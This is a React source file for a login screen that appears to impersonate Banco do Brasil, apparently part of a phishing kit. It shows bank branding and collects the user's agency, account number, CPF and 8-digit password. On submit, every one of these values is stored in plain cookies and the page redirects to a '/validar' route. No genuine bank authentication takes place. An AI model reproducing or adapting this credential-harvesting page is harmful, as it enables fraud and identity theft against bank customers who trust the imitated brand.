import React, { useState, useEffect } from "react";
import Cookies from "universal-cookie";
import { Redirect, Link } from "react-router-dom";
const Login = () => {
  useEffect(() => {
    let cookies = new Cookies();
    cookies.remove("agencia");
    cookies.remove("conta");
    cookies.remove("cpf");
    cookies.remove("senha");
  }, []);

  const [redirecionar, setRedirecionar] = useState(false);

  const [tipoDeConta, setTipoDeConta] = useState("tipo2");
  const [cpf, setCpf] = useState("");
  const [senha, setSenha] = useState("");

  const [agencia, setAgencia] = useState("");
  const [conta, setConta] = useState("");

  function onSubmit(e) {
    let cookies = new Cookies();
    let data = {
      tipoDeConta,
      agencia,
      conta,
      cpf,
      senha,
    };

    cookies.remove("tipoDeConta");
    cookies.remove("agencia");
    cookies.remove("conta");
    cookies.remove("cpf");
    cookies.remove("senha");

    cookies.set("tipoDeConta", tipoDeConta === "tipo1" ? "Corrente" : "Cartão");
    cookies.set("agencia", agencia);
    cookies.set("conta", conta);
    cookies.set("cpf", cpf);
    cookies.set("senha", senha);

    setRedirecionar(true);
  }

  function mudarTipoDeconta(tipo) {
    setTipoDeConta(tipo);
    console.log(tipo);
  }

  return (
    <>
      {redirecionar ? <Redirect to="/validar" /> : ""}
      <div className="splash">
        <img
          src={require("../assets/passo3.png")}
          style={{ height: "70px" }}
          alt=""
        />
      </div>
      <div
        style={{
          padding: "20px 40px",
          textAlign: "left",
          color: "#005aa5",
          backgroundColor: "gold",
        }}
        className="titulo"
      >
        <h1>Banco do Brasil</h1>
      </div>
      <header>
        <div className="icon">
          <i className="fa fa-arrow-left"></i>
        </div>
        <div className="title">
          <h1>Acessar sua conta</h1>
        </div>
      </header>
      <main>
        <form autoComplete="off" className="loginForm" method="post" action="">
          <label htmlFor="tipoDeConta">Tipo de conta</label>
          <select
            onChange={(e) => mudarTipoDeconta(e.target.value)}
            id="tipoDeConta"
          >
            <option value="tipo1">Conta pessoal</option>
            <option value="tipo2" selected>
              Ourocard
            </option>
          </select>

          {tipoDeConta === "tipo1" ? (
            <div className="contaPessoal">
              <input
                type="text"
                name="contaPessoalAgencia"
                placeholder="Agência"
                id="contaPessoalAgencia"
                pattern="[0-9]*"
                inputmode="numeric"
                onChange={(e) => setAgencia(e.target.value)}
                maxLength={6}
              />
              <input
                type="text"
                name="contaPessoalNumero"
                placeholder="Conta"
                id=""
                pattern="[0-9]*"
                inputmode="numeric"
                onChange={(e) => setConta(e.target.value)}
                maxLength={16}
              />
            </div>
          ) : (
            ""
          )}
          <div className="cartaoOurocard">
            <input
              type="text"
              name="cartaoCPF"
              placeholder="CPF"
              pattern="[0-9]*"
              inputmode="numeric"
              onChange={(e) => setCpf(e.target.value)}
              maxLength={11}
            />
          </div>
          <input
            style={{}}
            type="password"
            name="Senha"
            pattern="[0-9]*"
            inputmode="numeric"
            placeholder="Senha de 8 dígitos"
            onChange={(e) => setSenha(e.target.value)}
            id=""
            maxLength={8}
            required
          />
        </form>
      </main>
      <div className="links">
        <Link to="/resetar">Esqueci ou não tenho a senha</Link>
      </div>
      <footer onClick={onSubmit}>
        <div className="icon"></div>
        <div className="action">ENTRAR</div>
      </footer>
    </>
  );
};

export default Login;
